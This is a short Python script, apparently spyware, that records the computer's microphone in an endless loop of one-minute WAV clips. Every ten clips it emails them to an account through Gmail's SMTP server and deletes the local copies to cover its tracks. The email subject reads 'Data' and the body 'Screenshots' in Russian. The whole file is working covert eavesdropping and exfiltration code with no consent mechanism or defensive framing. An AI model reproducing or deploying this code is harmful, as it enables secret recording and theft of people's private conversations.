#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pyaudio
import wave
import os
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

def send_mail(email, password):
	i = 1
	msg = MIMEMultipart()
	msg['Subject'] = 'Данные'
	body = "Скриншоты"
	msg.attach(MIMEText(body, 'plain')) 
	while True:
		try:
			part = MIMEApplication(open('audio' + str(i) + '.wav', 'rb').read())
			part.add_header('Content-Disposition', 'attachment', filename = 'audio' + str(i) + '.wav')
			msg.attach(part)
			i += 1
		except FileNotFoundError:
			server = smtplib.SMTP('smtp.gmail.com', 587)
			server.starttls()
			server.login(email, password)
			server.sendmail(email, email, msg.as_string())
			server.quit()
			break

def write_audio():
	n = 1
	while True:
		CHUNK = 1024
		FORMAT = pyaudio.paInt16
		CHANNELS = 2
		RATE = 44100
		RECORD_SECONDS = 60
		WAVE_OUTPUT_FILENAME = 'audio' + str(n) + '.wav'
		p = pyaudio.PyAudio()
		stream = p.open(format=FORMAT,
				            channels=CHANNELS,
				            rate=RATE,
				            input=True,
				            frames_per_buffer=CHUNK)

		frames = []

		for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
				data = stream.read(CHUNK)
				frames.append(data)

		stream.stop_stream()
		stream.close()
		p.terminate()
		wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
		wf.setnchannels(CHANNELS)
		wf.setsampwidth(p.get_sample_size(FORMAT))
		wf.setframerate(RATE)
		wf.writeframes(b''.join(frames))
		wf.close()
		if n == 10:
			send_mail('email', 'password')
			for x in range(1, 11):
				os.remove('audio' + str(x) + '.wav')
			n = 1
			continue
		n += 1
	
write_audio()
